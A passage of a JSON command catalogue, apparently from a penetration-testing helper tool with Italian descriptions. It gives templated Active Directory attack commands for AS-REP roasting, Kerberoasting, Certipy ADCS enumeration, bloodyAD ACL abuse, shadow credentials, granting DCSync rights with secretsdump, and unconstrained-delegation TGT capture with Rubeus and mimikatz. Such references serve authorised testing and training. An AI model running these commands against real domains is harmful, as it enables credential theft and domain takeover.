        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "getnpusers",
    "name": "impacket-GetNPUsers — AS-REP roast",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "AS-REP Roasting",
    "description": "Preleva gli AS-REP degli account che hanno la pre-autenticazione Kerberos disabilitata, un'opzione lasciata spesso su account di servizio legacy. L'hash risultante si cracca offline con hashcat in mode 18200. Senza credenziali serve una lista di username, che si ottiene con kerbrute; con credenziali valide GetNPUsers li enumera da solo.",
    "note": "# Prossimo passo\nColpisce gli account con pre-auth Kerberos disabilitata (spesso servizi legacy): basta la user list, senza credenziali. L’hash AS-REP (modalità 18200 di hashcat) si cracka offline. Combina con kerbrute per la lista utenti.",
    "platform": "linux",
    "requires": [
      "no-creds",
      "password",
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "asrep"
    ],
    "template": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "ctx": "hash",
        "placeholder": "aad3b435..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Senza credenziali",
        "template": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
        "description": "Serve solo una lista di username (da `kerbrute userenum`): chiede l’AS-REP di ognuno, risponde con l’hash chi ha la pre-auth disabilitata."
      },
      {
        "id": "creds",
        "label": "Con password",
        "template": "impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <ip> -request -outputfile asrep.txt",
        "description": "`-request` trova da solo via LDAP gli account con `DONT_REQ_PREAUTH` e ne preleva l’hash: niente userlist."
      },
      {
        "id": "hash",
        "label": "NTLM hash",
        "template": "impacket-GetNPUsers <domain>/<user> -hashes :<hash> -dc-ip <ip> -request -outputfile asrep.txt",
        "description": "Stesso enum autenticato in Pass-the-Hash."
      }
    ]
  },
  {
    "id": "getuserspns",
    "name": "impacket-GetUserSPNs — Kerberoast",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Kerberoasting",
    "description": "Kerberoasting: richiede i TGS di tutti gli account con un SPN registrato, che qualsiasi utente autenticato può ottenere. Gli account di servizio hanno spesso password deboli e mai scadute, quindi l'hash risultante, craccabile offline con hashcat in mode 13100, cade con frequenza sorprendente. Richiede una qualsiasi credenziale di dominio valida.",
    "note": "# Prerequisiti\nServe un account di dominio valido. Richiede i TGS degli account con SPN (di servizio, password spesso deboli e vecchie): hash 13100 di hashcat. Se l’account è ad alto privilegio, è una scorciatoia verso DA.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "kerberoast"
    ],
    "template": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerb.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-roast",
    "name": "NetExec — roasting (AS-REP & Kerberoast)",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Roasting",
    "description": "Esegue in un comando il roasting di massa con credenziali valide: estrae gli hash AS-REP degli utenti senza preautenticazione e i TGS degli account con SPN. Entrambi si craccano offline.",
    "note": "# Prossimo passo\nAS-REP si cracca con hashcat mode 18200, Kerberoast con 13100. Un SPN su un account di servizio con password debole è una via rapida.\n# Interpretazione\nUn account roastabile con password forte non da nulla: valuta prima la password policy (spesso le service account hanno password vecchie e deboli).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos",
      "ldap"
    ],
    "tags": [
      "netexec",
      "nxc",
      "kerberoast",
      "asreproast"
    ],
    "template": "# AS-REP roast di massa (utenti senza preauth)\nnxc ldap <ip> -u <user> -p '<password>' --asreproast asrep.txt\n\n# Kerberoast di massa (utenti con SPN)\nnxc ldap <ip> -u <user> -p '<password>' --kerberoasting kerb.txt",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "certipy-find",
    "name": "Certipy — template vulnerabili",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - Recon",
    "description": "Enumera le Certificate Authority e i template ADCS del dominio, segnalando quelli vulnerabili alle misconfigurazioni note da ESC1 a ESC15. `-vulnerable -stdout` produce un riepilogo rapido a schermo, mentre senza filtri genera un report completo in BloodHound e testo. È il punto di partenza obbligato di ogni attacco ADCS.",
    "note": "# Prossimo passo\n-vulnerable -stdout elenca i template abusabili (ESC1-ESC15) con la relativa ESC. Da qui scegli l’attacco: ESC1 con certipy-req, ESC8 con il relay web, gli altri con certipy-esc. Recon obbligatoria prima di ogni abuso ADCS.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc1"
    ],
    "template": "certipy-ad find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Certipy — GitHub",
        "url": "https://github.com/ly4k/Certipy"
      },
      {
        "label": "SpecterOps — Certified Pre-Owned (ADCS)",
        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
      }
    ]
  },
  {
    "id": "acl-abuse",
    "name": "ACL abuse — bloodyAD",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Anello centrale della catena Foothold, BloodHound, ACL, DA: ogni arco che BloodHound disegna sul path diventa qui un comando.\n- `ForceChangePassword` / `GenericAll`, reset della password del target\n- `GenericWrite`, Shadow Credentials, senza toccare la password\n- `AddMember`, ti aggiungi al gruppo privilegiato",
    "note": "# Prossimo passo\nOgni arco che BloodHound disegna sul path diventa un comando: ForceChangePassword resetta la password, GenericAll/GenericWrite abilitano targeted roasting o reset. Esegui gli archi in ordine lungo il path fino a Domain Admins.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodyad",
      "acl",
      "shadow-credentials"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'NewP@ss123!'",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Oggetto target",
        "placeholder": "svc_admin"
      },
      {
        "key": "group",
        "label": "Gruppo",
        "placeholder": "Domain Admins"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ForceChangePassword",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'NewP@ss123!'",
        "description": "Resetta la password del target senza conoscere quella attuale."
      },
      {
        "id": "shadow",
        "label": "Shadow Credentials",
        "template": "certipy-ad shadow auto -u '<user>@<domain>' -p '<password>' -account <target> -dc-ip <ip>",
        "description": "`GenericWrite`: aggiunge `msDS-KeyCredentialLink` e recupera l’NT hash, senza toccare la password."
      },
      {
        "id": "addmember",
        "label": "AddMember",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add groupMember '<group>' <target>",
        "description": "Aggiunge un utente a un gruppo sul quale si dispone di `AddMember` o `GenericAll`."
      }
    ]
  },
  {
    "id": "acl-writeowner",
    "name": "WriteOwner — diventa owner e concediti i diritti",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "`WriteOwner` su un oggetto consente di diventarne owner e, da owner, di concedersi `GenericAll`, sfruttandolo poi come un normale ACL abuse con reset password o aggiunta a gruppo. Il cleanup finale è obbligatorio.",
    "note": "# Prossimo passo\nWriteOwner: ti rendi owner dell’oggetto, da owner ti concedi GenericAll, poi lo sfrutti come un normale ACL abuse (reset password o aggiunta a gruppo). Ripristina owner e ACL a fine test.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodyad",
      "acl",
      "writeowner"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Oggetto target",
        "placeholder": "svc_admin"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "bloodyAD",
        "template": "# ti assegna la proprietà dell'oggetto target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\n# da proprietario, ti concedi GenericAll sull'oggetto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
        "description": "Assegna la proprietà del target all'account controllato, che poi si concede `GenericAll`. Da lì l'abuso procede come un normale ACL, con reset password o aggiunta a gruppo."
      },
      {
        "id": "impacket",
        "label": "owneredit + dacledit",
        "template": "# riscrive il proprietario dell'oggetto target\nimpacket-owneredit -action write -new-owner <user> -target <target> '<domain>/<user>:<password>'\n\n# da proprietario, scrive una ACE FullControl a tuo favore\nimpacket-dacledit -action write -rights FullControl -principal <user> -target <target> '<domain>/<user>:<password>'",
        "description": "Cambia owner con `impacket-owneredit`, poi assegna FullControl con `impacket-dacledit`."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — Grant ownership",
        "url": "https://www.thehacker.recipes/ad/movement/dacl/grant-ownership"
      }
    ]
  },
  {
    "id": "targeted-kerberoast",
    "name": "Targeted Kerberoast — SPN via GenericWrite",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite` su un utente senza SPN gli aggiungi un SPN fittizio, richiedi il suo TGS, lo cracki offline e poi rimuovi l'SPN. `targetedKerberoast.py` automatizza tutto il ciclo. Crack con hashcat `-m 13100`.",
    "note": "# Prossimo passo\nCon GenericWrite su un utente senza SPN: aggiungi un SPN fittizio, richiedi il TGS, craccalo offline (13100) e rimuovi l’SPN. Se la password è debole ottieni le sue credenziali senza resettarla.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "kerberoast",
      "genericwrite",
      "targetedkerberoast"
    ],
    "template": "targetedKerberoast.py -d <domain> -u <user> -p '<password>' --dc-ip <ip>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Utente target",
        "placeholder": "svc_user"
      },
      {
        "key": "dc_fqdn",
        "label": "DC FQDN (per -k)",
        "placeholder": "dc01.corp.local"
      },
      {
        "key": "kirbi_b64",
        "label": "Kirbi base64 (opz.)",
        "placeholder": "doIF..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Automatico",
        "template": "targetedKerberoast.py -d <domain> -u <user> -p '<password>' --dc-ip <ip>",
        "description": "Aggiunge un SPN a ogni utente su cui si dispone di permessi di scrittura, preleva i TGS e rimuove l'SPN. `--request-user <target>` restringe l'operazione a un solo utente."
      },
      {
        "id": "manual",
        "label": "Manuale (bloodyAD)",
        "template": "# scrive uno SPN finto sull'account target, rendendolo kerberoastable\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName -v 'fake/spn'\n\n# richiede il TGS e salva l'hash da crackare offline\nimpacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip <ip> -request-user <target>\n\n# cleanup: rimuove lo SPN appena aggiunto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName",
        "description": "L'SPN fittizio va aggiunto, il TGS richiesto e l'SPN poi rimosso. Il crack avviene con hashcat in mode `-m 13100`."
      },
      {
        "id": "kerberos",
        "label": "Kerberos (-k / ccache)",
        "template": "# (se hai solo un .kirbi, es. da Rubeus tgtdeleg) decodifica e converti in ccache\necho '<kirbi_b64>' | base64 -d > <user>.kirbi\nimpacket-ticketConverter <user>.kirbi <user>.ccache\n\n# usa il TGT e sincronizza l'ora col DC (Kerberos tollera ~5 min di skew)\nexport KRB5CCNAME=$PWD/<user>.ccache\nsudo ntpdate <ip>\n\n# scrive lo SPN finto via Kerberos\nbloodyAD -k --host <dc_fqdn> -d <domain> set object <target> servicePrincipalName -v 'fake/spn'\n\n# richiede il TGS senza password, usando il ccache\nimpacket-GetUserSPNs -k -no-pass -dc-host <dc_fqdn> <domain>/ -request-user <target>\n\n# cleanup: rimuove lo SPN\nbloodyAD -k --host <dc_fqdn> -d <domain> set object <target> servicePrincipalName",
        "description": "Quando NTLM è disabilitato o hai solo un TGT, nessuna password. Se parti da un `.kirbi` (es. da `Rubeus tgtdeleg /nowrap`), decodificalo con `base64 -d` e convertilo in ccache con `impacket-ticketConverter`, poi esporta `KRB5CCNAME`. Richiede l'FQDN del DC in `/etc/hosts` e l'orologio sincronizzato col DC, altrimenti Kerberos fallisce per skew. Crack con hashcat `-m 13100` (RC4) oppure `-m 19700` se l'account accetta solo AES."
      }
    ],
    "refs": [
      {
        "label": "ShutdownRepo — targetedKerberoast",
        "url": "https://github.com/ShutdownRepo/targetedKerberoast"
      }
    ]
  },
  {
    "id": "targeted-asrep",
    "name": "Targeted ASREP Roast — disabilita pre-auth",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite` su un utente gli togli il flag di pre-autenticazione (`DONT_REQ_PREAUTH`), richiedi il suo hash AS-REP, lo cracki e poi rimetti il flag. Crack con hashcat `-m 18200`.",
    "note": "# Prossimo passo\nCon GenericWrite: togli il flag di pre-auth (DONT_REQ_PREAUTH), prendi l’hash AS-REP (18200), craccalo e rimetti il flag. Alternativa al targeted kerberoast quando l’utente non ha un SPN.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "asreproast",
      "genericwrite",
      "uac"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Utente target",
        "placeholder": "svc_user"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (bloodyAD)",
        "template": "# disattiva la pre-autenticazione Kerberos sull'account target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH\n\n# richiede l'AS-REP e salva l'hash in formato hashcat\nimpacket-GetNPUsers <domain>/<target> -dc-ip <ip> -no-pass -format hashcat\n\n# cleanup: rimette la pre-autenticazione come l'hai trovata\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove uac <target> -f DONT_REQ_PREAUTH",
        "description": "Togli la pre-auth, prendi l'AS-REP e rimettila. Crack con hashcat `-m 18200`."
      },
      {
        "id": "powerview",
        "label": "Windows (PowerView)",
        "template": "# toggle del flag DONT_REQ_PREAUTH sull'account target\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose\n\n# richiede l'AS-REP con Rubeus, formato hashcat\n.\\Rubeus.exe asreproast /user:<target> /format:hashcat /nowrap\n\n# ripete il toggle per rimettere il flag come prima\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
        "description": "Da Windows: flippi il bit `DONT_REQ_PREAUTH`, roast con Rubeus, poi riflippi (XOR di nuovo) per il cleanup."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — ASREProast",
        "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
      }
    ]
  },
  {
    "id": "shadow-creds",
    "name": "Shadow Credentials — certipy",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite` o `GenericAll` sull'attributo `msDS-KeyCredentialLink` del target si aggiunge una chiave propria e se ne ottiene l'NT hash via PKINIT, senza resettare la password dell'utente. `shadow auto` svolge tutto da solo: aggiunta, autenticazione, NT hash e pulizia.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "shadow-credentials",
      "certipy",
      "keycredentiallink",
      "acl"
    ],
    "template": "certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
    "params": [
      {
        "key": "user",
        "label": "User (con diritto)",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Target account",
        "placeholder": "victim"
      },
      {
        "key": "pfxb64",
        "label": "PFX base64 (da Whisker)",
        "placeholder": "MIIJ..."
      },
      {
        "key": "pfxpass",
        "label": "PFX password (da Whisker)",
        "placeholder": "generata-da-add"
      },
      {
        "key": "deviceid",
        "label": "Device ID (da add)",
        "placeholder": "2de4643a-..."
      },
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "certipy (auto)",
        "template": "certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <target> -dc-ip <dc>",
        "description": "Aggiunge la chiave, autentica e ritorna l'NT hash del target, poi pulisce."
      },
      {
        "id": "kerberos",
        "label": "Con Kerberos",
        "template": "certipy-ad shadow auto -u <user>@<domain> -k -account <target> -dc-ip <dc>",
        "description": "Come sopra ma via Kerberos (`-k`, usa il ccache): utile se NTLM è disabilitato."
      },
      {
        "id": "whisker",
        "label": "Whisker (Windows)",
        "template": "# 1. scrive msDS-KeyCredentialLink sul target usando il token corrente (nessuna password)\n.\\Whisker.exe add /target:<target>\n\n# 2. Rubeus (gia' stampato da add): PKINIT col PFX -> TGT + UnPAC-the-hash -> NT hash\n.\\Rubeus.exe asktgt /user:<target> /certificate:<pfxb64> /password:<pfxpass> /getcredentials /nowrap\n\n# 3. cleanup: rimuovi la key scritta (deviceID stampato da add)\n.\\Whisker.exe remove /target:<target> /deviceid:<deviceid>",
        "description": "Da un host Windows col token di `<user>`: `add` scrive la key e stampa già' il comando Rubeus pronto, con PFX e password generati da lui. `asktgt /getcredentials` fa PKINIT e UnPAC-the-hash restituendo l'NT hash. La password del target non viene mai toccata."
      }
    ],
    "note": "# pywhisker (passi separati)\nQuando serve maggiore controllo sulla sequenza di aggiunta, TGT, NT hash e cleanup:\n- `pywhisker.py --dc-ip <dc> -d <domain> -u <user> -p '<password>' --target <target> --action add`\n- `gettgtpkinit.py -cert-pfx generated.pfx -pfx-pass '<pfxpass>' -dc-ip <dc> <domain>/<target> t.ccache`\n- `getnthash.py -key <as_rep_key> <domain>/<target>`\n- cleanup: `pywhisker.py... --action remove --device-id <id>`\n\n# Se il KDC non supporta PKINIT\nShadow credentials richiede un DC con PKINIT (certificato KDC, tipico dove c'è AD CS). Se manca, `certipy`/`pywhisker` falliscono al login PKINIT e la tecnica non è applicabile: ripiega sul targeted Kerberoast, scrivendo un SPN sul target con lo stesso `GenericWrite` e poi `GetUserSPNs -request-user <target>`.",
    "refs": [
      {
        "label": "Certipy — GitHub",
        "url": "https://github.com/ly4k/Certipy"
      },
      {
        "label": "Whisker — GitHub",
        "url": "https://github.com/eladshamir/Whisker"
      }
    ]
  },
  {
    "id": "writedacl-dcsync",
    "name": "WriteDACL, DCSync",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Il permesso WriteDACL sull'oggetto dominio consente di modificare la sua ACL e di concedere all'account controllato i due diritti di replica, DS-Replication-Get-Changes e DS-Replication-Get-Changes-All, che abilitano il DCSync. È un percorso di escalation frequente nei path di BloodHound. Il diritto concesso va rimosso a fine attività.",
    "note": "# Cleanup obbligatorio\nI diritti di replica lasciati su un utente normale sono un finding critico è una backdoor: `bloodyAD... remove dcsync <user>` li rimuove una volta estratti gli hash.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "dcsync"
    ],
    "tags": [
      "bloodyad",
      "writedacl",
      "dcsync"
    ],
    "template": "# si concede i diritti di replica (DCSync) sul dominio\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add dcsync <user>\n\n# replica gli hash NTLM del dominio\nimpacket-secretsdump <domain>/<user>:'<password>'@<ip> -just-dc-ntlm\n\n# cleanup: rimuove i diritti di replica appena aggiunti\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove dcsync <user>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "bloodyad-acl",
    "name": "bloodyAD — abuso ACL",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Sfrutta i diritti ACL trovati in BloodHound usando bloodyAD, che parla LDAP direttamente da Kali. Un unico tool copre i casi più comuni: cambio password, aggiunta a gruppo, shadow credentials e cambio di owner.",
    "note": "# Quando\nDopo aver visto in BloodHound un arco come ForceChangePassword, GenericAll, GenericWrite, AddMember o WriteOwner verso un target.\n# Interpretazione\nForceChangePassword resetta la password del target (romperai il suo accesso: in lab ok). GenericAll su utente permette shadow credentials, più silenzioso. WriteOwner apre la strada a WriteDacl.\n# Errori comuni\nSe il DC impone LDAP firmato, bloodyAD può richiedere LDAPS: aggiungi la connessione su 636.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodyad",
      "acl",
      "forcechangepassword",
      "genericall"
    ],
    "template": "# ForceChangePassword: resetta la password del target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'Newpass123!'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "target",
        "label": "Target",
        "placeholder": "svc_sql"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ForceChangePassword",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'Newpass123!'",
        "description": "Resetta la password del target su cui hai ForceChangePassword."
      },
      {
        "id": "addmember",
        "label": "AddMember",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add groupMember <target> <user>",
        "description": "Aggiungi un principale a un gruppo su cui hai WriteMember/GenericWrite."
      },
      {
        "id": "shadow",
        "label": "GenericAll (shadow creds)",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add shadowCredentials <target>",
        "description": "Con GenericAll su un account: aggiungi una chiave e autenticati via PKINIT senza toccare la password."
      },
      {
        "id": "owner",
        "label": "WriteOwner",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>",
        "description": "Diventa owner dell oggetto: passo preliminare per riscriverne la DACL."
      }
    ]
  },
  {
    "id": "owneredit-dacledit",
    "name": "owneredit + dacledit (WriteOwner a FullControl)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Catena Impacket per trasformare WriteOwner in controllo pieno: prima si diventa owner dell oggetto, poi si riscrive la sua DACL concedendosi FullControl, da cui si prosegue con shadow credentials o DCSync.",
    "note": "# Prossimo passo\nCon FullControl sull oggetto: shadow credentials se è un utente, oppure concessione dei diritti DCSync se il target è il dominio.\n# Errori comuni\nRipristina owner e DACL dopo (entrambi i tool hanno -action read per annotare lo stato originale). Gli script arrivano con Impacket recente come owneredit.py / dacledit.py.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "impacket",
      "owneredit",
      "dacledit",
      "acl",
      "writeowner"
    ],
    "template": "# 1. diventa owner dell oggetto (hai WriteOwner)\nowneredit.py -action write -new-owner <user> -target <target> <domain>/<user>:'<password>'\n\n# 2. concediti FullControl sull oggetto\ndacledit.py -action write -rights FullControl -principal <user> -target <target> <domain>/<user>:'<password>'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "target",
        "label": "Target",
        "placeholder": "svc_sql"
      }
    ]
  },
  {
    "id": "unconstrained-deleg",
    "name": "Unconstrained Delegation — coerce, TGT",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (Unconstrained)",
    "description": "Con SYSTEM su una macchina con unconstrained delegation il flusso è: monitoraggio dei TGT in arrivo, coercizione del DC ad autenticarsi verso quella macchina, cattura del suo TGT e infine DCSync. L'enumerazione preliminare si fa con `Get-DomainComputer -Unconstrained`.",
    "note": "# Prerequisiti\nServe SYSTEM su una macchina con unconstrained delegation (trovala con PowerView/BloodHound). Flusso: monitori i TGT in arrivo (Rubeus monitor), coerci il DC ad autenticarsi (Coercer/PetitPotam), catturi il suo TGT e lo riusi per DCSync.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "unconstrained",
      "delegation",
      "rubeus",
      "coerce"
    ],
    "template": "# sulla macchina con delega unconstrained: cattura i TGT in arrivo\n.\\Rubeus.exe monitor /interval:5 /nowrap\n\n# da Kali: forza il DC ad autenticarsi verso di te\ncoercer coerce -u '<user>' -p '<password>' -d <domain> -l <lhost> -t <dc>\n\n# inietta in memoria il TGT del DC appena catturato\n.\\Rubeus.exe ptt /ticket:<tgt_b64>\n\n# con il TGT del DC, replica gli hash del dominio\nmimikatz # lsadump::dcsync /user:<domain>\\Administrator",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      },
      {
        "key": "tgt_b64",
        "label": "TGT base64",
        "placeholder": "doIF..."
      }
    ]
  },
  {
    "id": "constrained-deleg",
    "name": "Constrained Delegation — abuso S4U",
    "category": "active-directory",
